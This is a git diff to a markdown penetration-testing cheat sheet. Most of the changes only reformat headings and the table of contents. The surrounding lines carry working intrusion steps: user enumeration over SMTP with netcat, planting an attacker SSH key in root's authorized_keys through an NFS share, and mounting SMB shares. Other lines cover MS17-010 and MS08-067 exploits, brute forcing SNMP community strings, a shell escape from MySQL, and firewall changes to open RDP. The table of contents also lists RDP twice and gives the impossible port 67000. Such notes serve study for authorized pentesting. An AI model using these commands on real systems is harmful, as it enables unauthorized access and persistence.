@@ -7,12 +7,16 @@
 * [HTTP - TCP 80/8080/443/8443](#HTTP---TCP-80/8080/443/8443)
 * [Telnet - TCP 23](#Telnet---TCP-23)  
 * [SMTP - TCP 25](#SMTP---TCP-25)
-* [SMTP](#SMTP---TCP-25)
-* [SMTP](#SMTP---TCP-25)
-* [SMTP](#SMTP---TCP-25)
-* [SMTP](#SMTP---TCP-25)
-* [SMTP](#SMTP---TCP-25)
-
+* [DNS - TCP 53](#DNS---TCP-53)
+* [Remote Procedure Call (RPC) - TCP 111](#Remote Procedure-Call---TCP-111)
+* [SMB Netbios SMBD - TCP 135-139,445](#SMB NETBIOS-SMBD---TCP-135-139,445)
+* [SMBD Samba - TCP 139](#SMBD-SAMBA---TCP-139)
+* [MSRPC - TCP 135](#MSRPC---TCP-135)
+* [SNMP - UDP 161](#SNMP---UDP-161)
+* [MySQL - TCP 3306](#MySQL---TCP-3306)
+* [RDP - TCP 3389](#RDP---TCP-3389)
+* [IRC - TCP 6660-6669,6697,67000](#IRC---TCP-6660-6669,6697,67000)
+* [RDP - TCP 3389](#RDP---TCP-3389)  
 [Web](#WEB)  
 [Initial Exploitation](#INITIAL-EXPLOITATION)  
 [Linux Privilege Escalation](#LINUX-PRIVESC)  
@@ -89,8 +93,7 @@ Manual fingerprinting
 $ echo VRFY 'admin' | nc -nv -w 1 $target_ip 25
 ```
 
-
-__DNS (TCP 53)__
+### DNS---TCP-53
 
 Changing nameserver to target IP, revealing additional domains / directories.
 ```bash
@@ -114,7 +117,7 @@ vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
 friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
 ```
 
-__Remote Procedure Call - RPC (TCP 111)__
+### Remote Procedure Call - TCP 111
 
 Exploit NFS shares
 ```
@@ -139,7 +142,7 @@ $ cat hacker_rsa.pub >> authorized_keys                     # add your public ke
 $ ssh -i /root/.ssh/hacker_rsa root@192.168.1.112           # SSH to target using your private key
 ```
 
-__SMB / NETBIOS / SMBD (TCP 135-139 - 445)__  
+### SMB NETBIOS SMBD - TCP 135-139,445
 SMB is a communications protocol primarily designed for file sharing and printer sharing. It is not intended as a general networking tool.  
 
 Netbios is an API for the SMB protocol. A SMB client will interact with a Netbios API to send an SMB command to an SMB server, then listen for replies.
@@ -177,15 +180,12 @@ $ net use z: \\10.11.1.49\Users /user:alice aliceishere     // mount with auth
 $ net use z: \\ACCESS\SHARENAME$                            // mount without auth
 ```
 
-
 Working exploits:
 * [MS08-067] NetAPI module in Windows SMB
 * [MS17_010] Eternal blue detection: `use auxiliary/scanner/smb/smb_ms17_010`
 * [MS17-010 ALTERNATIVE METHOD]: Adding new admin account https://www.securenetworkinc.com/news/2017/9/7/a-guide-to-exploiting-ms17-010-with-metasploit
 
-
-
-__SMBD / SAMBA (TCP 139)__
+### SMBD SAMBA - TCP 139
 
 SMBD/Sambda is a server to provide SMB service to clients
 
@@ -193,10 +193,10 @@ Working exploits:
 * Samba 2.2.x remote buffer overflow: https://www.exploit-db.com/exploits/7
 
 
-__MSRPC (TCP 135)__
+### MSRPC - TCP 135
 * Stuff
 
-__SNMP (UDP 161)__
+### SNMP - UDP 161
 
 SNMP enumeration:
 ```
@@ -216,7 +216,7 @@ done < community.txt
 
 Community string wordlist: https://github.com/danielmiessler/SecLists/blob/master/Discovery/SNMP/common-snmp-community-strings.txt
 
-__MySQL (TCP 3306)__
+### MySQL - TCP 3306
 
 Connect:
 ```
@@ -228,7 +228,7 @@ Drop to a shell (as the user running MySQL):
 mysql> \! /bin/bash
 ```
 
-__RDP (TCP 3389)__
+### RDP - TCP 3389
 
 If you have credentials, you can enable the RDP service then log in:
 ```powershell
@@ -259,7 +259,7 @@ Remote Desktop service to allow RDP traffic. [UDP 3389]" enable=yes
 profile=private,domain localport=3389 protocol=udp
 ```
 
-__IRC (TCP 6660-6669, 6697, 67000)__
+### IRC - TCP 6660-6669,6697,67000
 
 IRC enum:
 * Start `hexchat` in Kali.
